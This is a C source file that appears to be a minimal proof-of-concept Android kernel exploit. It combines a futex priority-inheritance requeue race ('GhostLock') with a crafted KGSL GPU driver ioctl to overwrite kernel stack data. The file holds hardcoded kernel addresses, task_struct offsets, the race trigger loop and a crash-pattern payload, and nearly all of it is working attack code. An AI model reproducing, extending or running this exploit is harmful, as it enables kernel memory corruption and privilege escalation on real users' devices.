/**
 * ghostlock32_minimal.c — Minimal 32-bit GhostLock + KGSL stack overwrite
 *
 * Skips Kernelsnitch — uses hardcoded kernel addresses.
 * Goal: Verify GhostLock trigger + KGSL ioctl work together on 32-bit.
 *
 * Compile (32-bit ARM):
 *   armv7a-linux-androideabi33-clang -static -O2 -pthread ghostlock32_minimal.c -o g32_min
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <pthread.h>
#include <time.h>
#include <stdint.h>
#include <signal.h>

/* ── KGSL ioctl ──────────────────────────────────────────────────── */
#define KGSL_DEVICE "/dev/kgsl-3d0"
#define KGSL_IOCTL(nr, sz) \
    (((uint32_t)3 << 30) | (((uint32_t)(sz)) << 16) | (((uint32_t)0x09) << 8) | ((uint32_t)(nr)))
#define IOCTL_KGSL_DRAWCTXT_CREATE  KGSL_IOCTL(0x13, 0x08)
#define IOCTL_KGSL_DRAWCTXT_DESTROY KGSL_IOCTL(0x14, 0x04)
#define IOCTL_KGSL_RB_ISSUEIBCMDS   KGSL_IOCTL(0x10, 0x20)

/* ── Known kernel addresses (from device, slide=0) ───────────────── */
#define INIT_TASK       0xffffff800b81c180ULL
#define KIMAGE_BASE     0xffffff8008080000ULL
#define P0_PAGE_OFFSET  0xffffff8000000000ULL

/* ── task_struct offsets (from target.h) ──────────────────────────── */
#define TASK_PID_OFF       0x630
#define TASK_TGID_OFF      0x634
#define TASK_COMM_OFF      0x7e8
#define TASK_PI_WAITERS_OFF 0x8b8
#define TASK_PI_BLOCKED_ON_OFF 0x8d0

/* ── GhostLock futex state ───────────────────────────────────────── */
static uint32_t f_wait       __attribute__((aligned(4096)));
static uint32_t f_pi_target  __attribute__((aligned(4096)));
static uint32_t f_pi_chain   __attribute__((aligned(4096)));
static volatile int waiter_ready, owner_started, route_done;

static inline long futex_op(uint32_t *uaddr, int op, uint32_t val,
                             const struct timespec *timeout,
                             uint32_t *uaddr2, uint32_t val3) {
    return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

/* ── KGSL context management ─────────────────────────────────────── */
static int kgsl_fd = -1;
static uint32_t kgsl_ctx_id = 0;

static int kgsl_create_context(void) {
    struct { uint32_t flags; uint32_t id; } c = {0, 0};
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c);
    printf("[kgsl] DRAWCTXT_CREATE: ret=%d id=%u errno=%d\n", ret, c.id, errno);
    if (ret < 0) return -1;
    kgsl_ctx_id = c.id;
    return 0;
}

/* ── Waiter thread ───────────────────────────────────────────────── */
static void *waiter_thread(void *arg) {
    (void)arg;
    printf("[waiter] locking pi_chain...\n");
    long r = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[waiter] pi_chain locked, ret=%ld errno=%d\n", r, errno);

    struct timespec timeout;
    clock_gettime(CLOCK_MONOTONIC, &timeout);
    timeout.tv_sec += 10;

    waiter_ready = 1;
    while (!owner_started) usleep(1000);

    printf("[waiter] entering FUTEX_WAIT_REQUEUE_PI...\n");
    r = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
    printf("[waiter] WAIT_REQUEUE_PI returned: %ld errno=%d\n", r, errno);

    /* ── KGSL stack overwrite ─────────────────────────────────── */
    printf("\n[kgsl] Opening %s...\n", KGSL_DEVICE);
    kgsl_fd = open(KGSL_DEVICE, O_RDWR);
    if (kgsl_fd < 0) {
        printf("[kgsl] FAIL: open errno=%d\n", errno);
        goto cleanup;
    }
    printf("[kgsl] opened fd=%d\n", kgsl_fd);

    if (kgsl_create_context() < 0) {
        printf("[kgsl] context creation failed, trying ctx_id=0\n");
        kgsl_ctx_id = 0;
    }

    /* Build ibdesc: 16 bytes → pi_tree.left + TASK pointer */
    struct { uint64_t gpuaddr; uint64_t sizedwords; } ibdesc = {
        .gpuaddr    = 0x0,
        .sizedwords = 0x4141414141414141ULL,  /* crash pattern */
    };

    struct {
        uint32_t drawctxt_id;
        uint32_t flags;
        uint32_t ibdesc_addr;
        uint32_t timestamp;
        uint32_t numibs;
    } cmd = {
        .drawctxt_id = kgsl_ctx_id,
        .flags = 0,
        .ibdesc_addr = (uint32_t)(uintptr_t)&ibdesc,
        .timestamp = 0,
        .numibs = 1,
    };

    printf("[kgsl] Firing RB_ISSUEIBCMDS:\n");
    printf("[kgsl]   ibdesc gpuaddr=0x%016llx sizedwords=0x%016llx\n",
           (unsigned long long)ibdesc.gpuaddr,
           (unsigned long long)ibdesc.sizedwords);
    printf("[kgsl]   cmd ctx=%u ibdesc=0x%08x numibs=%u\n",
           cmd.drawctxt_id, cmd.ibdesc_addr, cmd.numibs);

    int ioctl_ret = ioctl(kgsl_fd, IOCTL_KGSL_RB_ISSUEIBCMDS, &cmd);
    printf("[kgsl] RB_ISSUEIBCMDS: ret=%d errno=%d (%s)\n",
           ioctl_ret, errno, ioctl_ret < 0 ? strerror(errno) : "OK");

    route_done = 1;

cleanup:
    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    if (kgsl_fd >= 0) close(kgsl_fd);
    return NULL;
}

/* ── Owner thread ────────────────────────────────────────────────── */
static void *owner_thread(void *arg) {
    (void)arg;
    printf("[owner] locking pi_target...\n");
    long r = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[owner] pi_target locked, ret=%ld errno=%d\n", r, errno);
    owner_started = 1;

    while (!waiter_ready) usleep(1000);
    usleep(500000);  /* Let waiter enter FUTEX_WAIT_REQUEUE_PI */

    printf("[owner] locking pi_chain (creates PI chain)...\n");
    r = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[owner] pi_chain locked, ret=%ld errno=%d\n", r, errno);

    while (!route_done) sleep(1);
    return NULL;
}

/* ── Main ────────────────────────────────────────────────────────── */
int main(void) {
    printf("\n=== Minimal 32-bit GhostLock + KGSL PoC ===\n\n");

    /* Fault in futex pages */
    f_wait = 0;
    f_pi_target = 0;
    f_pi_chain = 0;

    printf("[*] Known addresses:\n");
    printf("    init_task = 0x%016llx\n", INIT_TASK);
    printf("    kimage    = 0x%016llx\n", KIMAGE_BASE);

    /* Start threads */
    pthread_t waiter, owner;
    pthread_create(&waiter, NULL, waiter_thread, NULL);
    usleep(200000);  /* Let waiter lock pi_chain and enter FUTEX_WAIT_REQUEUE_PI */
    pthread_create(&owner,  NULL, owner_thread,  NULL);
    usleep(300000);  /* Let owner lock pi_target */

    /* ── GhostLock trigger ── */
    printf("[trigger] f_wait=0x%08x, sending FUTEX_CMP_REQUEUE_PI...\n", f_wait);

    for (int attempt = 0; attempt < 100; attempt++) {
        long ret = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                            (void *)(uintptr_t)1, &f_pi_target, 0);
        if (attempt < 5 || ret >= 0)
            printf("[trigger] attempt %d: ret=%ld errno=%d\n", attempt, ret, errno);
        if (ret >= 0) break;
        usleep(1000);
    }

    /* Wait for completion */
    for (int i = 0; i < 15 && !route_done; i++) sleep(1);

    printf("\n=== PoC Complete ===\n");
    printf("[*] Route done: %s\n", route_done ? "YES" : "NO");
    printf("[*] Check dmesg for panic: adb shell dmesg | tail -30\n");

    pthread_join(waiter, NULL);
    pthread_join(owner, NULL);
    return 0;
}
